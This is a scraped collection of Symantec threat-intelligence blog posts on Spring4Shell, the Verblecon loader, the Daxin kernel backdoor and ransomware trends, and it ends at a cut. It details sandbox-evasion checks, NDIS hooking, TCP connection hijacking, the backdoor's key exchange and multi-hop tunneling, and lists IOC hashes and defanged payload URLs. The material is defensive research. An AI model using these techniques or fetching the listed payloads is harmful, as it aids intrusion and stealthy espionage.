2317d3e14ab214f06ae38a729524646971e21b398eda15cc9deb8b00b231abc3 2417da3adebd446b9fcb8b896adb14ea495a4d923e3655e5033f78d8e648fcc8 37f56127226ce96af501c8d805e76156ca6b87da1ba1bb5d227100912f6c52d9 3aa54e7d99b69a81c8b25ab57aeb971644ed0a206743c9e51a80ec1852f03663 3ff2d6954a6b62afb7499e1e317af64502570181fd49ac5a74e2f7947e2e89db 4f6a768841595293146ca04f879efa988e4e95ce0f2bc299cb669fea55e78b65 5269db6b19a1d758c75e58ee9bbf2f8fd684cfedbfe712d5b0182d7bbd3a1690 5bc68df582c86c884b563b15057cc223f2e9bc1022ebb297e32a9a7e3036228b 6b4692029f05489ecda10e11cfacfc3b19097856b88647d3695f3bdc7dd83ce9 7b581c0305c78f28bad60028c63e852dc34fc9e28f39e4b0af73d80c1d9680c9 83030f299a776114878bcd2ade585d97836ef4ddb6943cb796be2c88bcb83a83 90a03dabfc4e56a12cc3bac5cbe991db044b900a01ec341803c864506e467ffa 9917a2213f114e87745867e5fea6717efd727d7c08fdc851969224be2f0e019b 9b5f9ff82ed238bcbd83628ed3ec84988dc05f81cec9e45a512fbd2c8ac45c33 adfe177ade7d9bfe4df251a69678102aec1104a4ba9f73032dd90aba76d8bdd9 b76fde584f87c88bdd21fab613335ce7fc05788aa4bb3191d1517ec16ef4d11a ce45af43dd2af52d6034e981515474147802efdfe036e00078fee29a01694fd6 d461347388ccf0c2008332a1674885a41f70b94b2263bddef44e796d3b1b43b5 df993dca434c3cd2da94b6a90b0ae1650d9c95ea1d5f6a5267aca640d8c6d00e ee46e714660f7652502d5b3633fae0c08c8018f51cfb56a487afd58d04dd551a fe33fdd5a63fee62362c9db329dde11080a0152e513ef0e6f680286a6a7b243f The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/cicada-apt10-china-ngo-government-attacks"
  },
  {
    "title": "spring4shell rce vuln java",
    "content": "UPDATE, April 1, 2022:Updated with additional protection information A zero-day vulnerability in the Spring Core Java framework that could allow for unauthenticated remote code execution (RCE) on vulnerable applications was publicly disclosed on March 30, before a patch was released. It was dubbed Spring4Shell. Yes, Symantec products will guard against exploit attempts with the following detections: Data Center Security (DCS) Intrusion Prevention (with default policies) provides zero-day protection against exploitation of the Spring4Shell vulnerability. Spring has now released Spring Framework 5.3.18 and 5.2.20, which it says address the vulnerability. Spring Boot 2.6.6 and 2.5.12 that depend on Spring Framework 5.3.18 have also been released.Temporary remediation stepswere also published by researchers at Praetorian prior to the updates being released. Springalso published suggested workarounds in its blog. A CVE report for the vulnerability was also published this afternoon and given the designationCVE-2022-22965, and assessed as being “high severity.” There appears to have been confusion about the potential severity of Spring4Shell. While it was initially reported that all versions of Spring Core with the JDK version greater than or equal to 9.0 were vulnerable to it, researcherssubsequently determinedthat it appears Spring Coremust be configured in a certain wayto be vulnerable. In itsvulnerability report, Spring itself stated that for the “specific exploit” to work, an application must meet the following prerequisites: “If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit,” the advisory reads. However, it did also say that “the nature of the vulnerability is more general, and there may be other ways to exploit it.” Given these prerequisites, it’s not clear how many instances of the Spring Core Java framework may be vulnerable to this bug. Proof-of-concept exploit code for Spring4Shell was leaked on GitHub shortly after it was discovered and before a patch was issued. The code was swiftly removed, but not before it was downloaded by several security researchers who confirmed the vulnerability. It was also reposted on various platforms, meaning it was available to the public, including malicious actors. Ithas been reported that Spring4Shell was being actively exploitedin attacks. Spring4Shell is a bug in Spring Core, a popular application framework that allows software developers to quickly and easily develop Java applications with enterprise-level features. These applications can then be deployed on servers, such as Apache Tomcat, as stand-alone packages with all the required dependencies. The bug allows an unauthenticated attacker to execute arbitrary code on a vulnerable system. In a blog published on Thursday(March 31), Spring revealed that the Spring4Shell bug was reported to VMware (which owns Spring) by researchers from AntGroup FG on Tuesday, with the team intending to release emergency patches for the bug on Thursday, but details of the bug were leaked online on Wednesday. No, CVE-2022-22963 is a different bug in the Spring Cloud Function, which is a separate Java library from Spring Core. An advisory for this bugwas published on March 29and patches are available for it. While the naming of the vulnerability appears to have been inspired by theLog4Shell vulnerability that was discovered in December 2021, it is not clear if the impact of this bug will be as significant. We will update this blog with any new relevant information as we get it. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/spring4shell-rce-vuln-java"
  },
  {
    "title": "verblecon sophisticated malware cryptocurrency mining discord",
    "content": "An unknown attacker is using a complex and powerful new malware loader in relatively unsophisticated and low-reward attacks, indicating they may not realize the potential capabilities of the malware they are deploying. The malware, Trojan.Verblecon, is being used in attacks that appear to have installing cryptocurrency miners on infected machines as their end goal. There are some indications the attacker may also be interested in stealing access tokens for chat app Discord. However, the capabilities of this malware indicate that it could be highly dangerous if leveraged in ransomware or espionage campaigns. Verblecon was first spotted by analysts from Symantec, a division ofBroadcom Software, in January 2022. This blog will detail the capabilities of the malware. The malware is loaded as a server-side polymorphic JAR file. The fact that the file is polymorphic means that, due to encryption and obfuscation, the code of the malware payload looks different each time it is downloaded. Attackers generally pack malware in this way in an effort to evade detection by security software. The malware samples analyzed by Symantec were fully obfuscated, in the code flow, strings, and symbols. The samples themselves may be based onpublicly available code. Once started, the malware checks its command-line arguments. It requires at least one command-line argument to execute, which could be the infection or campaign ID initially e.g. \"CSIDL_SYSTEM_DRIVE\\program files\\java\\jre1.8.0_301\\bin\\javaw.exe\" -jar \"CSIDL_PROFILE\\appdata\\local\\temp\\rpvbh.jar\" masonkhonsari \"CSIDL_SYSTEM_DRIVE\\program files\\java\\jre1.8.0_301\\bin\\javaw.exe\" -jar \"CSIDL_PROFILE\\appdata\\local\\temp\\rpvbh.jar\" 923ec15ffa4474ca7bf200bfb90e782d Additionally, it also attempts to determine if its own process is being debugged by checking for the following Java command-line arguments: Next, it attempts to detect if it is being opened in a virtual or sandbox environment, which would indicate it is likely being opened on a security researcher’s machine. First, it checks for the following directories: It also obtains the machine MAC address and attempts to check for the following prefixes, which may indicate the file is being opened on a virtual machine: Following those checks, it executes the following command to obtain a list of running processes: It then appears to check these processes against a set list: It then also checks for the following files: Next, it appears to check the user name against the following: Then it executes the following command: It is unclear how the output is processed, however, there are some strings that could be related to this or other registry checks: If satisfied with these checks, it may copy itself as one of the following files: And then create one of the following files to use as a loadpoint: [INFECTION_ID] is computed as follows: Then it periodically attempts to connect to the following URLs: [DGA_NAME] is apparently generated using the following method: The traffic generated by the malware looks like this: The server response appears as the below. Some of the strings in this response indicate that the attacker may be leveraging legitimate Cloudflare infrastructure to host some of their C&C infrastructure. The server response body above is an encrypted blob that contains a URL signed with an RSA key. This blob can be decrypted and validated as follows: The malware then starts communicating with the decoded URL by sending details about the infected computer: The request body contains the following information about the infected machine in encrypted form: The server has been observed to respond as follows: Where the response body can be decrypted as follows: The last term above contains the following string: Some samples of the malware are seen communicating with the following servers: Communication between the malware and servers is over HTTP or HTTPS and this communication appears to culminate with victims being directed to connect to the following: The payload is downloaded from the URL observed earlier: The payload is obfuscated in a similar way to the other samples, and also contains similar techniques to detect the virtualization environment, as well as other functionality. The core functionality is to download and execute a binary blob from the following URL: The blob is decrypted along with *.bin artifacts from the same host. The downloaded blob is then cached on the local filesystem (in re-encrypted form) and injected into %Windows%\\SysWow64\\dllhost.exe for execution. The injection is performed using com.sun.jna and doesn't use usual APIs for injection. The final payload (hardwick.bin) contains the following embedded URL pointing to a configuration file for a cryptocurrency miner: This indicates that the purpose of this activity was to install cryptocurrency mining software on victim machines. The evidence found on victim networks appears to indicate that the goal of the attacker was to install cryptocurrency mining software on victim machines. This would appear to be a relatively low-reward goal for the attacker given the level of effort that would have been required to develop this sophisticated malware. There are also indications that the attacker may be stealing Discord tokens and using these to advertise Trojanized videogame applications. We suspect they were stealing Discord tokens because some of the obfuscated strings refer to pathnames that are apparently related to Discord clients, specifically: Discord is a group chatting app that is particularly popular among the gaming community. Advertising Trojanized videogame applications via Discord is likely a redistribution channel for Trojan.Verblecon. Most of the infections we saw where this malware was used were on non-enterprise machines; we rarely see ransomware deployed on non-enterprise machines. Previous reportshave connected related domains to a single occurrence of ransomware, but the infrastructure may be shared with an unrelated actor. The similarities between that incident and the activity we observed includes: However, we do not have enough evidence to draw a definitive link between both these sets of activity. The activity we have seen carried out using this sophisticated loader indicates that it is being wielded by an individual who may not realize the capabilities of the malware they are using. However, if it fell into the hands of a more sophisticated actor the potential is there for this loader to be used for more serious attacks, including potentially ransomware and espionage campaigns. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 32a9415daa7f37a93dd0b347461844673c0f5baf0c15c01ee48b147dadf28299 3688c249774cc9a28d2b9b316921cec842bb087c57f4733cf5866226fbe2aeed 5a4f6332ad08b35c055bb5e6dfddc79d2f7905e63fac7595efbedd0b27f12eb8 007f5898c52c3aa1c3dca6d3a30f28f5f72d9789fbb440ae656d88959f68e53e f3f4af5f5eae1a28ad5a01b56d71302a265bce17d2c87ce731edf440612818a6 hxxp://verble[.]software/styles.jar hxxps://jonathanhardwick[.]me/hardwick.jar hxxps://jonathanhardwick[.]me/hardwick.bin hxxps://jonathanhardwick[.]me/config.txt hxxp://test.verble[.]rocks/dorflersaladreviews.jar hxxp://test.verble[.]rocks/dorflersaladreviews.bin The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/verblecon-sophisticated-malware-cryptocurrency-mining-discord"
  },
  {
    "title": "daxin backdoor espionage analysis",
    "content": "This is the concluding part of our in-depth analysis of Backdoor. Daxin, advanced malware that is being used by a China-linked espionage group. In this blog, we will analyze the communications and network features of the malware. In ourprevious blog, we set up a lab consisting of four separate networks and five machines. Some of the machines had two network interfaces to communicate with different networks, but all packet forwarding functionality was disabled. Each machine ran various network services that were reachable from its neighbors only. In this section we will dissect the network traffic between two backdoor instances running on the separate computers “Alice-PC” and “Bob-PC”. The traffic was initiated by the Daxin backdoor running on “Alice-PC” when it was instructed to create a communication channel to “Dave-PC” passing via two intermediate nodes, “Bob-PC” and “Charlie-PC”, as described previously. Using Wireshark, we captured traffic between two backdoor instances, one running on “Alice-PC” and the other on “Bob-PC”, as shown in Figure 2. Starting with the key exchange, all backdoor communication is carried out by exchanging messages that follow the same underlying format: Themagicvalue is always 0x9910 or 0x9911. Thekindvalue identifies the state transition during key exchange. Then, once the encrypted communication channel is established, it encodes the purpose of each message and determines the formatting of the data that follows the fixed-size header. The initial message of the key exchange in the Wireshark capture is not encrypted: It can be decoded as follows: The fieldsmagicandkindcorrespond to the first three bytes of TCP data, 0x10 0x99 0x11. On the target computer, in case it is infected with a copy of the malicious driver, this sequence causes the TCP connection to be hijacked, as explained inpart one of this blog series. The target checks that the received message is valid according to the session state machine, ensuring thatmagicis the expected constant 0x9910 andkindmatches any of two supported values: 0x10 or 0x11. Next, it generates a nonce to use when encrypting any future incoming messages. Finally, it sends a response message with the nonce, its own details, and the information about the infected machine. Parts of the response message are encrypted using a combination of the following algorithms: The details of this response message are as follows: The message includes the backdoor login that is recognized during the following key exchange step, and what looks like malware build and version numbers. Looking at the decoded message, we find references to “XRT” and these reassemble the hardcoded Name “NDISXRPT” that we documented when discussing theNdisRegisterProtocol()call during driver initialization: The initiator responds with the backdoor login and hashed password: It also includes its own nonce, like this: At this point, the peers exchange their nonces and compute two transport keys. Each transport key is used in stream mode to encrypt the TCP half-stream directed towards the side that generated the corresponding nonce. The peers also combined their nonces into the shared key. This shared key will be used to encrypt the body of each exchanged message, reusing the same key every time. The final key exchange message confirms that the initiator was successfully authenticated and the backdoor is ready to process instructions: It can be decoded as follows: For the messages that follow, thekindfield encodes the message purpose. This determines the formatting of the message body. For example, the backdoor instruction to set up new connectivity across multiple malicious nodes useskindvalue 6 with the following message body structure: We could continue to decrypt all the backdoor communication that follows: For example, the next message in the captured network traffic is: This instructs the backdoor to set up remaining connectivity across malicious nodes as explained in the “Backdoor capabilities” section in our previous blog: The most interesting observation about encryption is that Daxin supports two methods for computing the shared key during the key exchange. To select which of the two methods to use, the initiator examines the target message, comparing what looks like build and version numbers against certain hardcoded constants. This could be in order to facilitate upgrading the malicious network in the field without disruption. Additionally, the current key exchange implementation involves additional obfuscation that is not present in some older samples. It is possible that the attacker was forced to change the algorithm and decided to implement additional measures to protect the details of new logic. An alternative explanation is that different teams within the attacker organization were sharing the same codebase, where one of these teams implemented the alternative key exchange method and related obfuscations to mitigate against potential compromise due to the other team’s activity, while still sharing some of the communication infrastructure. The communications protocol documented in the previous section is how two backdoor instances communicate with each other. On top of that, the analyzed sample also supports two additional communication methods. These additional methods are well suited for crossing the perimeter of the target organization. One of these additional communication methods uses HTTP messages to encapsulate backdoor communications. To demonstrate this, we implemented our own client to interact with the backdoor using this method. Our client communicated with the backdoor instance running on “Alice-PC” over HTTP to control a set of infected machines, as discussed in the previous two sections. On the target computer, in case it is infected with a copy of Daxin, the first HTTP request causes the TCP connection to be hijacked due to the malicious packet filter triggering on the HTTP “POST” method string with URI substring “756981520337” as explained in the “Networking” section of our previous blog. Daxin then parses HTTP request headers and extracts the request body. The request body is then interpreted using the same logic as already described in the “Communications protocol” section. The reverse communication is then encapsulated as the HTTP response body. When generating the HTTP response, the malicious driver includes “SID” cookie. The value of “SID” cookie is then used when constructing the URI for the subsequent HTTP request. The malicious driver can also be configured to communicate with a remote TCP server for command and control. It then periodically connects to the remote server, performs a handshake that is unique to this connectivity method, and then starts backdoor communication. This connectivity method is controlled with persistent configuration that can be updated by the remote attacker, as explained in the “Backdoor capabilities” section of our previous blog. To obtain the details of the TCP server to connect to, Daxin checks the value of the “HOST” configuration item. In case the value starts with “http://”, the TCP server details are retrieved from the remote web server, as described below. Otherwise, the configuration value is interpreted as the TCP server address and port. In order to retrieve the TCP server details from the remote web server, the analyzed sample contacts the provided URL and scans the received HTTP response, including HTTP headers, for magic strings. Whenever it finds “f8xD4C01” followed later by “d7C6x12B”, it attempts to interpret any data immediately following the first marker as a hexadecimal string. The data obtained by decoding the hexadecimal string is then decrypted using the following algorithm: The decrypted data are interpreted as the TCP server address and port to use. Whenever the analyzed sample connects to the TCP server, it sends the following sequence of bytes as its handshake: Thetags_valueparameter is the value of the “TAGS” configuration item. We suspect that the remote server uses thetags_valuefor tracking specific infections. The analyzed sample then expects to receive the following hardcoded sequence of bytes from the remote server: This should be followed by the usual key exchange as described in the “Communication protocol” section, where the remote server acts as initiator. This concludes the second and final part of our technical analysis of Backdoor.Daxin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/daxin-backdoor-espionage-analysis"
  },
  {
    "title": "ransomware threat landscape what expect 2022",
    "content": "Ransomware continued to be the most significant cyber threat facing enterprises during 2021. While ransomware gangs are currently experiencing a period of turmoil and disruption, there is no guarantee that the threat posed by ransomware will abate in 2022, since similar disruptions in the past were usually followed by the emergence of new threats. According to anew whitepaperpublished by the Symantec Threat Hunter team, part ofBroadcom Software, targeted ransomware attacks continued to trend upwards in 2021, almost trebling between the first and final quarters of the year. One of the main developments during 2021 was the disappearance of established threat actors and the emergence of new groups to take their place. Of the major ransomware threats operating at the beginning of 2021, only Conti continued to remain active at year end. During 2021, a number of high-profile ransomware operations disappeared. These included Leafroller (aka Sodinokibi, REvil), Coreid (Darkside and Blackmatter), and Avaddon. However, a number of new actors have emerged to take their place. LockBit expanded rapidly following the departure of some of its rivals, while several new threats such as Pinion (Hive) and Sirex (AvosLocker) became quite active. One of the key trends noted in this research is the constantly evolving set of tools, tactics, and procedures (TTPS) employed by ransomware attackers. New TTPs emerge regularly as attackers bid to stay one step ahead of network defenders. Ransomware groups these days now employ quite a diverse toolset, making use of a mixture custom malware, legitimate software, and operating system features (also known as living off the land). This diverse toolset is evident in the ten most frequently employed TTPs Symantec’s Threat Hunter Team found in ransomware investigations. The most frequently used tool, PsExec, is a Windows operating system feature that is often abused by attackers for executing processes on other systems. The next most frequently used tool was Cobalt Strike, which is off-the-shelf malware ostensibly sold as a penetration testing tool but is most frequently seen being used for malicious purposes. New TTPs seen during the latter half of 2021 include abuse of VssAdmin, a legitimate Windows process that can be used to manage or delete shadow copies on Windows machines; along with abuse of MSIExec, a legitimate Windows installer that can be used by attackers to load malicious payloads onto targeted machines. This was just a sample of the content in our latest whitepaper.Read the full paperfor more insights into the ransomware threat landscape. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-threat-landscape-what-expect-2022"
  },
  {
    "title": "daxin malware espionage analysis",
    "content": "Following on from ourearlier blogdetailing the discovery of Backdoor.Daxin, Symantec’s Threat Hunter Team, part of Broadcom Software, would like to provide further technical details on this threat. Used by a China-linked espionage group, Daxin exhibits technical sophistication previously unseen by such actors. In particular, it implements communications features that appear to have been designed for deep penetration of highly-secured networks. The focus of this blog series is to document how these features were implemented. Daxin comes in the form of a Windows kernel driver. In this blog, we will detail the driver initialization, networking, key exchange, and backdoor functionality. In our next blog, the second of two, we will examine the communications and network features of the malware. Our analysis is based on a Backdoor.Daxin sample (SHA256: ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef). The forensic evidence collected by us indicates that this sample had been deployed in November 2021 against two separate organizations. The described Daxin features are contained in many earlier Daxin variants unless stated otherwise. The recent changes to the driver codebase are to support more recent Windows versions and fix certain bugs. The Daxin sample analyzed appears to be packed with a standard VMProtect packer. Many earlier samples feature an additional, outside, packing layer on top of VMProtect. That outside packer was custom-made for the driver and even reused the same customized encryption algorithm used in the final payload. We believe that the attackers decided to remove that custom packer due to compatibility issues with recent Windows releases. Whenever the driver is started, the code added by the packer decrypts and decompresses the final payload, and then passes control to the entry point of the decompressed payload. At this point, the malicious code is visible in kernel memory, albeit with some obfuscations. The bulk of the payload initialization code is involved with the network stack of the Windows kernel. This includes identification of some non-exported structures and hooking of the Windows TCP/IP stack. Daxin hooks the Network Driver Interface Specification (NDIS) layer by modifying every pre-existingNDIS_OPEN_BLOCKfor the TCP/IP protocol, where theReceiveNetBufferListsandProtSendNetBufferListsCompletehandlers are replaced with its own. For each of theseNDIS_OPEN_BLOCKs, the relatedNDIS_M_DRIVER_BLOCKmay also be modified by replacing any existingSendNetBufferListsHandler. When theSendNetBufferListsHandleris not present, the correspondingNDIS_MINIPORT_BLOCKis modified by replacingNextSendNetBufferListsHandler. To identify allNDIS_OPEN_BLOCKsfor the TCP/IP protocol, the driver relies on callingNdisRegisterProtocol()to create and return a new head of non-exportedndisProtocolList. Then it walksndisProtocolListof everyNDIS_PROTOCOL_BLOCKcomparing theNameattribute of each visitedNDIS_PROTOCOL_BLOCKstructure with the string “TCPIP”. TheOpenQueuefield of the matching structure points to the list ofNDIS_OPEN_BLOCKsto hook. This basic technique isknown and documented, but Daxin hooks a slightly different set of handlers. We believe that these adjustments are not exclusive to Daxin and are driven by architectural changes in Windows Network Architecture. In order to identify the relatedNDIS_M_DRIVER_BLOCKsandNDIS_MINIPORT_BLOCKs, the driver analyses “ndis.sys” machine code to locate non-exportedndisFindMiniportOnGlobalList()andndisMiniDriverList. The relevantNDIS_MINIPORT_BLOCKsare then obtained starting with the previously identifiedNDIS_OPEN_BLOCKs, where theRootDeviceNameof each instance is passed as a parameter for thendisFindMiniportOnGlobalList()call that returns the structure to hook. Finally, to locate relatedNDIS_M_DRIVER_BLOCKs, the driver walksndisMiniDriverListchecking theMiniportQueuelist of each item for the already identifiedNDIS_MINIPORT_BLOCKs. Details of the hooking process demonstrated in this blog were captured in the lab using a virtual machine with a kernel debugger attached. When registering the fake protocol, Daxin calls theNdisRegisterProtocol()API passing aProtocolCharacteristicsargument with the hardcodedNameattribute “NDISXRPT”. Because the layout of theNDIS_OPEN_BLOCKstructure changes between different Windows builds, Daxin needs to determine the correct offsets to use. First it checksNtBuildNumberagainst a set of hardcoded values for whichNDIS_OPEN_BLOCKoffsets are explicitly given (Figure 2). The most recent Windows build number hardcoded in Daxin’s codebase is 17763. It corresponds to Windows Server 2019 and Windows 10 version 1809 (Redstone 5). When the Windows build is not recognized, Daxin attempts to use an alternative method to determine the NDIS_OPEN_BLOCK offsets. Daxin then collects details of all NDIS structures to hook, as discussed earlier, along with information about the related network interfaces. Finally, for each network interface, it replaces the original handlers with its own. Both theReceiveNetBufferListshook and theSendNetBufferListsHandler(orNextSendNetBufferListsHandler) hook implement logic to inspect the network packets and then hijack some packets before passing the remaining packets to the original handlers. TheProtSendNetBufferListsCompletehook completes any send operation initiated by Daxin, such thatNET_BUFFER_LISTstructures owned by malware are removed and deallocated before calling the original handler. Before describing the hooks’ implementation in detail, we will first examine a few examples of the observed behavior in Daxin. In the first scenario, theReceiveNetBufferListshook checks the data section of certain TCP packets for predefined patterns. Any matching TCP packets are then removed from theNetBufferListsbefore calling the originalReceiveNetBufferListshandler. At the same time, for each removed TCP packet, the malicious driver sends two new packets. The first packet is a spoofed RST TCP packet sent to the original destination, so that its recipient marks the TCP connection as closed. The second packet is an ACK TCP packet sent to the original source. From that point, the malicious driver maintains the TCP connection with the original source, relying on theReceiveNetBufferListshook to hijack any related network packets. A test demonstrating this scenario is illustrated in Figure 4. When generating its network traffic, Daxin uses its own code to forge network packets, bypassing the legitimate Windows TCP/IP stack. To illustrate this, we reconfigured the Windows TCP/IP stack to use non-standardTime to Live (TTL). Since Daxin does not respect the updated parameter, its traffic stands out in the Wireshark capture shown in Figure 4. The TCP retransmissions in the Wireshark capture are due to our scripts for the kernel debugger that slow down driver response. The retransmissions are not expected otherwise. We decided to activate these scripts to illustrate the internal working of the driver, where we can recognize individual packets from our Wireshark capture, as illustrated in Figure 5. In another scenario, Daxin initiates a new TCP connection and maintains it over the whole lifetime of the TCP session. The malware relies on theReceiveNetBufferListshook to hijack any network packets related to this connection. The hijacked packets do not reach the legitimate Windows TCP/IP driver. An example TCP connection initiated by the malicious driver will be discussed later in this blog series. In the last scenario, Daxin sends a DNS request using the UDP protocol. The response UDP packet is hijacked by theReceiveNetBufferListshook and the DNS response is parsed by the malicious driver. We exercised this functionality in our lab when exploring configuration options related to command-and-control connectivity. The described scenarios indicate that Daxin implements its own TCP/IP stack. This was confirmed with further reverse engineering of the driver, where we identified both data structures and subroutines implementing IPv4, TCP, and UDP. The main purpose of the NDIS hooks installed by Daxin is to allow for its malicious TCP/IP stack to coexist with the legitimate Windows TCP/IP stack on the same machine. When certain conditions are met, the hooks also allow it to hijack pre-existing TCP connections. TheReceiveNetBufferListshook checks theNblFlagsmember of theNET_BUFFER_LISTstructure at the head of itsNetBufferListsargument for theNDIS_NBL_FLAGS_IS_LOOPBACK_PACKETflag. Whenever the flag is set, the hook simply passes the network data to the originalReceiveNetBufferListshandler with no other processing. Otherwise, it calls a helper subroutine passing theNetBufferListslinked list ofNET_BUFFER_LISTs. The helper subroutine divides the original linked list ofNET_BUFFER_LISTsinto two chains: one chain of allowed packets for further processing by the legitimate stack and another chain of hijacked packets to drop. The hook then passes the chain of allowed packets to the originalReceiveNetBufferListshandler. Next, if theNDIS_RECEIVE_FLAGS_RESOURCESflag is not set in itsReceiveFlagsargument, the hook releases ownership of the chain of hijacked packets usingNdisReturnNetBufferLists(). TheSendNetBufferListsHandlerhook checks if theNdisPoolHandlemember of theNET_BUFFER_LISTstructure, passed as itsNetBufferListargument, corresponds to the pool created by Daxin itself to use when sending malicious traffic. If so, the hook simply passes the network data to the originalSendNetBufferListsHandlerwith no other processing. Otherwise, it calls the same helper subroutine as used by theReceiveNetBufferListshook to divide itsNetBufferListargument into two chains. It then passes the chain of allowed packets to the originalSendNetBufferListsHandler. Finally, the chain of hijacked packets is retired using theNdisMSendNetBufferListsComplete()orProtSendNetBufferListsCompletehandler. The helper subroutine used by both hooks walks the original linked list ofNET_BUFFER_LISTsextracting network packets from each visitedNET_BUFFER_LISTstructure and calling the malicious packet filter for each extracted packet. The verdict returned by the packet filter for the first packet from the visitedNET_BUFFER_LISTstructure determines if the structure should be allowed for further processing by the legitimate stack or dropped by the hook. The packet filter is central to the networking capabilities of Daxin as it controls dispatching of the extracted packets to various Daxin's sub-modules, where each sub-module implements different functionality. The filter returns an “accept” or “drop” verdict to indicate if relevant packets should reach the legitimate TCP/IP stack or not. It operates as follows: Finally, theProtSendNetBufferListsCompletehook walks the list ofNET_BUFFER_LISTstructures passed as its second argument checking if theNdisPoolHandlemember of the visitedNET_BUFFER_LISTstructure corresponds to the pool created by the malicious driver itself to use when sending malicious traffic. The matching structures are removed from the list and, after validating the Flags member, deallocated. The hook then passes the modified list to the originalProtSendNetBufferListsCompletehandler. Atechnical paper by Kasperskyon the Slingshot advanced persistent threat (APT) group describes a technique to identifyNET_BUFFER_LISTthat is very similar to how theProtSendNetBufferListsCompletehook works, including the use ofNdisAllocateNetBufferListPool()andNdisAllocateNetBufferAndNetBufferList().However, there are no other significant structural overlaps. Whenever Daxin hijacks a TCP connection, it checks the received data for a specific message. The expected message initiates a custom key exchange, where two peers follow complementary steps. When discussing this key exchange protocol, we are going to use the term “initiator” when referring to the side sending the initial message. The opposite side will be called “target”. Interestingly, the analyzed sample can implement both the initiator side and the target side of this custom key exchange protocol. Firstly, Daxin starts the target-side protocol for each hijacked TCP connection. Additionally, it can be configured to connect to a remote TCP server, where it exchanges a certain handshake and then also starts the target-side protocol. This scenario will be discussed in our next blog in this series in a section titled “External communication.” Finally, Daxin can be instructed to connect to a remote TCP server, where it starts the initiator-side protocol. We will expand on this in the next section. A successful key exchange opens an encrypted communication channel. Daxin uses this communication channel to exchange various messages. Some messages instruct the malware to perform various operations, such as starting an arbitrary process on the affected computer. Others carry results of these operations, such as output generated by the started process, for example. The set of operations recognized by Daxin is rather compact, with the most basic operations being reading and writing arbitrary files. Daxin can also execute arbitrary EXE and DLL binaries. In the case of EXE files, Daxin starts a new user-mode process. The standard input and output of the started process is redirected, so that the remote attacker can interactively send input and receive output. When ordered to execute a DLL file, Daxin performs injection into one of the pre-existing “svchost.exe” processes. Daxin provides a dedicated communication mechanism for any additional components deployed by the attacker on the affected computer. Any compatible component can open a “\\\\.\\Tcp4” device created by Daxin to register itself for communication, where it can optionally assign a 32-bit service identifier to distinguish itself from other services that may be active on the same computer. Daxin then forwards any matching communication between the remote attacker and registered services. Next, the remote attacker can inspect and update the backdoor configuration. The configuration is implemented as a generic key-value structure that is stored in an encrypted form in the Windows Registry for persistence. All used configuration items will be listed in the “External communication” section in a subsequent blog. There are also dedicated messages that encapsulate raw network packets to be transmitted via a local network adapter. Any response packets are then captured by the malicious driver and forwarded to the remote attacker. This allows the remote attacker to establish communications with any servers reachable from the affected machine on the target’s network, creating a network tunnel for the remote attacker to interact with servers of interest. Finally, a special message can be used to set up new connectivity across multiple malicious nodes, where the list of nodes is included in a single command. For each node, the message provides the details required to establish communication, specifically the node IP address, its TCP port number, and the credentials to use during custom key exchange. When Daxin receives this message, it picks the next node from the list. Then it uses its malicious TCP/IP stack to connect to the TCP server listed in the picked entry. Once connected, Daxin starts the initiator-side protocol. On the peer computer, if it is infected with a copy of Daxin, the initiator traffic causes the TCP connection to be hijacked, as explained earlier. This is followed by the custom key exchange to open a new encrypted communication channel. Next, the connecting driver sends an updated copy of the original message over this new channel, where the position of the next node to use is incremented. The process then repeats for the remaining nodes on the list. The TCP connections created during the above process, along with the connection that received the original connectivity setup instruction are then used for subsequent communications. Whenever an intermediate node receives a message, it may execute the requested operation or forward it along the connectivity path. For certain operations, the node to execute the operation is specified by the position along the path. In some remaining cases, the operation is always forwarded to the last node. Finally, certain operations are always executed by the first node only. This method to create multi-hop connectivity is noteworthy. It is not uncommon for the attackers to jump through multiple hops in victim networks to get around firewalls or to better blend in with usual network traffic. This usually involves multiple steps when using other malware, where each jump requires a separate action. However, in the case of the analyzed sample, the attackers combined these into a single operation. This may indicate that Daxin is optimized for attacks against well-protected networks and cases when the attackers need to periodically reconnect into the compromised network. The ability to use hijacked TCP connections for backdoor communications is also significant. This may be required when exploiting tightly controlled networks, with strict firewall rules or when the defenders monitor for network anomalies. On the infected machine, any malicious network connections are bypassing the Windows TCP/IP stack, and this could provide some degree of stealth. The attackers invested significant effort in implementing these features with a malicious TCP/IP stack supporting TCP connection hijacking. The implementation of network tunneling, where the malicious driver passes the packets directly between the remote attacker and the target’s network demonstrates how the attackers attempt to minimize their footprint without sacrificing functionality. In order to demonstrate Daxin’s backdoor capabilities, we prepared a lab setup to both illustrate what was described in the previous section and also to collect some examples of malicious network traffic to discuss later. Our lab setup consisted of four separate networks and five machines. Some of the machines had two network interfaces to communicate with different networks, but all packet forwarding functionality was disabled. Each machine ran various network services that were reachable from its neighbors only. In our setup, the attackers can communicate with “Alice-PC”, while all of the other machines are unreachable directly to the attackers. This simulates the network of a hypothetical victim, where machines serving different roles have very restrictive connectivity. “Alice-PC” could represent a DMZ service that is accessible from the internet, but all the other machines are tightly isolated. We infected all of the configured machines with Daxin, except for just one machine deep in our network that was left clean. Next, based on our understanding 